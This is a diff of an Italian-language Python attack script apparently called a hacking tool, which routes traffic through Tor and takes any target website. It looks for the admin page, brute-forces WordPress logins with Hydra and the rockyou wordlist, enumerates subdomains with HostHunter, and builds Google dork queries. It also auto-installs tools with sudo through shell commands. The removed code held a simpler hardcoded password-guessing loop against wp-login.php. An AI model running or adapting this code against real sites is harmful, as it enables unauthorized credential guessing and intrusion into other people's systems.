@@ -9,8 +9,6 @@ from bs4 import BeautifulSoup, Comment
 from scapy.all import sr1, IP, ICMP
 from socket import gethostbyname, gethostbyaddr
 import json
-from itertools import product
-from string import ascii_letters, digits
 
 def pulisci_schermo():
     """Pulisce lo schermo del terminale."""
@@ -19,21 +17,35 @@ def pulisci_schermo():
 def display_ascii_art():
     """Mostra il disegno ASCII all'inizio dell'esecuzione"""
     print("""
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣶⣾⣿⡉⢤⣍⡓⢶⣶⣦⣤⣉⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣷⡀⠙⣿⣷⣌⠻⣿⣿⣿⣶⣌⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠈⢿⣿⡆⠹⣿⣿⣿⣿⣷⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠹⣿⡄⢻⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⣿⣿⣷⣽⣷⢸⣿⡿⣿⡿⠿⠿⣆⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠐⠾⢭⣭⡼⠟⠃⣤⡆⠘⢟⢺⣦⡀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀
-⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀
-⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
-⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀                    ____
+                 _.' :  `._
+             .-.'`.  ;   .'`.-.
+    __      / : ___\ ;  /___ ; \      __
+  ,'_ ""--.:__;".-.";: :".-.":__;.--"" _`,
+  :' `.t""--.. '<@.`;_  ',@>` ..--""j.' `;
+       `:-.._J '-.-'L__ `-- ' L_..-;'
+         "-.__ ;  .-"  "-.  : __.-"
+             L ' /.------.\ ' J
+              "-.   "--"   .-"
+             __.l"-:_JL_;-";.__
+          .-j/'.;  ;""""  / .'\"-.
+        .' /:`. "-.:     .-" .';  `.
+     .-"  / ;  "-. "-..-" .-"  :    "-.
+  .+"-.  : :      "-.__.-"      ;-._   \
+  ; \  `.; ;                    : : "+. ;
+  :  ;   ; ;                    : ;  : \:
+ : `."-; ;  ;                  :  ;   ,/;
+  ;    -: ;  :                ;  : .-"'  :
+  :\     \  : ;             : \.-"      :
+   ;`.    \  ; :            ;.'_..--  / ;
+   :  "-.  "-:  ;          :/."      .'  :
+     \       .-`.\        /t-""  ":-+.   :
+      `.  .-"    `l    __/ /`. :  ; ; \  ;
+        \   .-" .-"-.-"  .' .'j \  /   ;/
+         \ / .-"   /.     .'.' ;_:'    ;
+          :-""-.`./-.'     /    `.___.'
+                \ `t  ._  /  by haggaruccio
+                 "-.t-._:'⠀⠀
                 
 by hagg4r""")
 
@@ -46,6 +58,29 @@ def start_tor():
         print("Tor avviato correttamente.")
     except Exception as e:
         print(f"Errore durante l'avvio di Tor: {e}")
+
+def install_tool(tool_name, install_command):
+    """Verifica se un tool è installato e, in caso contrario, lo installa."""
+    try:
+        subprocess.run([tool_name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        print(f"{tool_name} è già installato.")
+    except FileNotFoundError:
+        print(f"{tool_name} non trovato. Installazione in corso...")
+        subprocess.run(install_command, shell=True)
+        print(f"{tool_name} installato correttamente.")
+
+def install_required_tools():
+    """Installa i tool necessari se non sono presenti."""
+    install_tool('hydra', 'sudo apt-get install -y hydra')
+    install_tool('git', 'sudo apt-get install -y git')
+    
+    # Installazione di HostHunter
+    if not os.path.exists('HostHunter'):
+        print("Clonazione di HostHunter da GitHub...")
+        subprocess.run('git clone https://github.com/SpiderLabs/HostHunter.git', shell=True)
+        print("HostHunter installato correttamente.")
+    else:
+        print("HostHunter è già presente.")
 
 def find_admin_page(url):
     """Trova la pagina admin del sito web"""
@@ -72,8 +107,8 @@ def find_admin_page(url):
             # Simula il salvataggio del database in un file di testo
             save_database_to_txt(url)
 
-            # Tentativo di brute force
-            brute_force_admin(url)
+            # Tentativo di brute force con Hydra
+            brute_force_hydra(url, "/wp-login.php")
         else:
             print("Pagina Admin non trovata.")
     except Exception as e:
@@ -87,84 +122,74 @@ def save_database_to_txt(url):
         with open(txt_file_path, 'w') as file:
             file.write(database_content)
         print(f"\nDatabase salvato in {txt_file_path}")
-
-        # Mostra il peso del file
-        file_size = os.path.getsize(txt_file_path)
-        print(f"Peso del file: {file_size} bytes")
     except Exception as e:
         print(f"Errore durante il salvataggio del database: {e}")
 
-def brute_force_admin(url):
-    """Esegue il brute force delle credenziali di accesso admin"""
-    username = "admin"
-    passwords = ['admin', 'password123', '123456', 'admin123']  # Esempi di password comuni
-    headers = {"User-Agent": "Mozilla/5.0"}
-
-    for password in passwords:
-        response = requests.post(f"http://{url}/wp-login.php", data={'log': username, 'pwd': password}, headers=headers, timeout=10)
-        if "dashboard" in response.url:
-            print(f"Brute force riuscito con username: {username} e password: {password}")
-            break
-        else:
-            print(f"Tentativo fallito con password: {password}")
+def brute_force_hydra(url, login_path):
+    """Esegue un attacco di brute force con Hydra"""
+    print("\nInizio brute force con Hydra...")
+    try:
+        result = subprocess.check_output(
+            ['hydra', '-l', 'admin', '-P', '/usr/share/wordlists/rockyou.txt', '-s', '80', '-f', f'{url}', 'http-post-form', f"{login_path}:log=^USER^&pwd=^PASS^:S=302"],
+            text=True
+        )
+        print(f"Risultati Hydra:\n{result}")
+    except Exception as e:
+        print(f"Errore durante il brute force con Hydra: {e}")
 
 def scan_for_errors(url):
-    """Scansiona il sito web per errori e debolezze di sicurezza"""
-    error_patterns = [
-        "404 Not Found", "500 Internal Server Error", "403 Forbidden",
-        "SQL syntax", "Error establishing a database connection", "PHP Warning"
-    ]
+    """Scansiona il sito web alla ricerca di commenti HTML e altre potenziali vulnerabilità"""
     headers = {"User-Agent": "Mozilla/5.0"}
-    
     try:
-        response = requests.get(f"http://{url}", headers=headers, timeout=5)
-        for pattern in error_patterns:
-            if pattern in response.text:
-                print(f"Errore trovato: {pattern}")
+        response = requests.get(url, headers=headers)
+        soup = BeautifulSoup(response.text, 'html.parser')
+
+        # Controlla i commenti HTML
+        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
+        if comments:
+            print("\nCommenti HTML trovati:")
+            for comment in comments:
+                print(comment)
+
+        # Controlla altre vulnerabilità comuni
+        if "wp-content" in response.text:
+            print("\nPotenziale vulnerabilità WordPress trovata!")
+
     except Exception as e:
         print(f"Errore durante la scansione: {e}")
 
-def execute_google_dorks():
-    """Esegue Google Dorks per scoprire vulnerabilità note o informazioni sensibili."""
-    google_dorks = [
-        'site:example.com intitle:index.of',
-        'site:example.com inurl:wp-admin',
-        'site:example.com "phpinfo.php"',
-        'site:example.com "Welcome to Wordpress"',
-        'site:example.com ext:sql | ext:db | ext:log'
+def google_dorks_search(url):
+    """Esegue una ricerca Google Dorks per il sito web target."""
+    print("Eseguendo ricerca Google Dorks...")
+    dorks = [
+        f"inurl:admin site:{url}",
+        f"inurl:login site:{url}",
+        f"intext:'index of' site:{url}"
     ]
+    for dork in dorks:
+        print(f"Query: {dork}")
+        time.sleep(2)  # Simula la ricerca (in realtà, dovrebbe essere eseguita manualmente)
 
+def hosthunter_scan(domain):
+    """Esegue la scansione dei sottodomini utilizzando HostHunter."""
     try:
-        for dork in google_dorks:
-            response = requests.get(f"https://www.google.com/search?q={dork}", timeout=5)
-            soup = BeautifulSoup(response.text, 'html.parser')
-            for link in soup.find_all('a'):
-                url = link.get('href')
-                if 'url?q=' in url and not url.startswith('/'):
-                    print(f"Trovato risultato interessante con Google Dork: {url}")
+        print(f"Eseguendo scansione HostHunter per il dominio {domain}...")
+        result = subprocess.check_output(['python3', 'HostHunter.py', '-d', domain], text=True)
+        print(f"Risultati HostHunter:\n{result}")
     except Exception as e:
-        print(f"Errore durante l'esecuzione di Google Dorks: {e}")
-
-def hosthunter_search(url):
-    """Esegue una ricerca HostHunter per trovare sottodomini e altre informazioni correlate."""
-    print("Esecuzione di HostHunter...")
-    try:
-        # Esegui il comando di HostHunter (devi averlo installato e configurato)
-        # subprocess.run(['hosthunter', '--target', url, '--output', f'{url}_subdomains.txt'])
-        print(f"HostHunter ha finito di cercare i sottodomini per {url}")
-    except Exception as e:
-        print(f"Errore durante l'esecuzione di HostHunter: {e}")
+        print(f"Errore durante la scansione HostHunter: {e}")
 
 def main():
     pulisci_schermo()
     display_ascii_art()
+    install_required_tools()  # Installazione dei tool richiesti
     start_tor()
-    
-    url = input("\nInserisci l'URL del sito web target: ")
-    find_admin_page(url)
-    scan_for_errors(url)
-    execute_google_dorks()
-    hosthunter_search(url)
+
+    target_url = input("Inserisci il sito web target (senza http/https): ")
+    find_admin_page(target_url)
+    scan_for_errors(f"http://{target_url}")
+    google_dorks_search(target_url)
+    hosthunter_scan(target_url)
 
 if __name__ == "__main__":
     main()
